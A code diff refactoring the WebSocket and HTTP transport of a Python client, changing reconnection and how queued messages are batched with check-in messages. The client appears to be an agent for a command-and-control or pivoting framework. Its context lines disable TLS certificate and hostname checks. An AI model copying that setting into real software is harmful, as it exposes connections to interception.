@@ -790,24 +790,23 @@ class WSClient(Client):
         self.server_url = server_url.strip('/')
         self.headers = {'User-Agent': user_agent}
         self.proxy = proxy
-        self.session = aiohttp.ClientSession(headers=self.headers)
+        self.ws = None
+        self.session = None
         self.ssl_context = ssl.create_default_context()
         self.ssl_context.check_hostname = False
         self.ssl_context.verify_mode = ssl.CERT_NONE
         self.upstream_messages = asyncio.Queue()
+        self._pending = []
 
     async def close_transport(self):
-        if self.session and not self.session.closed:
-            await self.session.close()
-
-    async def reset_transport(self):
-        if hasattr(self, 'ws') and self.ws and not self.ws.closed:
+        if self.ws and not self.ws.closed:
             await self.ws.close()
         if self.session and not self.session.closed:
             await self.session.close()
-        self.session = aiohttp.ClientSession(headers=self.headers)
 
     async def connect(self):
+        await self.close_transport()
+        self.session = aiohttp.ClientSession(headers=self.headers)
         self.ws = await self.session.ws_connect(
             self.server_url,
             ssl=self.ssl_context,
@@ -854,25 +853,19 @@ class WSClient(Client):
             if self.killed:
                 break
 
-    def _requeue_first(self, message):
-        remaining = [message]
-        while not self.upstream_messages.empty():
-            remaining.append(self.upstream_messages.get_nowait())
-        for m in remaining:
-            self.upstream_messages.put_nowait(m)
-
     async def _send_loop(self):
         while True:
-            message = await self.upstream_messages.get()
+            if not self._pending:
+                self._pending.append(await self.upstream_messages.get())
+                while not self.upstream_messages.empty():
+                    self._pending.append(self.upstream_messages.get_nowait())
             try:
-                await self.ws.send_bytes(self.serialize_messages(
-                    [CheckInMessage(messenger_id=self.identifier), message]))
+                batch = [CheckInMessage(messenger_id=self.identifier)]
+                batch.extend(self._pending)
+                await self.ws.send_bytes(self.serialize_messages(batch))
+                self._pending.clear()
             except Exception:
-                self._requeue_first(message)
                 break
-            except BaseException:
-                self._requeue_first(message)
-                raise
 
     async def send_upstream_message(self, upstream_message):
         # Producer: just enqueue. The single send loop serializes the socket.
@@ -934,10 +927,8 @@ class HTTPClient(Client):
         await self.readvertise_forwarders()
         while not self.killed:
             if not self._pending:
-                for _ in range(5):
-                    if self.upstream_messages.empty():
-                        break
-                    self._pending.append(await self.upstream_messages.get())
+                while not self.upstream_messages.empty():
+                    self._pending.append(self.upstream_messages.get_nowait())
 
             to_send = [CheckInMessage(messenger_id=self.identifier)]
             to_send.extend(self._pending)
@@ -1155,8 +1146,6 @@ async def main():
             print(f'[*] Attempting to reconnect (attempt {consecutive_failures}/{retry_attempts})')
             await asyncio.sleep(sleep_time)
             try:
-                if hasattr(client, 'reset_transport'):
-                    await client.reset_transport()
                 await client.connect()
                 print(f'[+] Reconnected')
                 consecutive_failures = 0
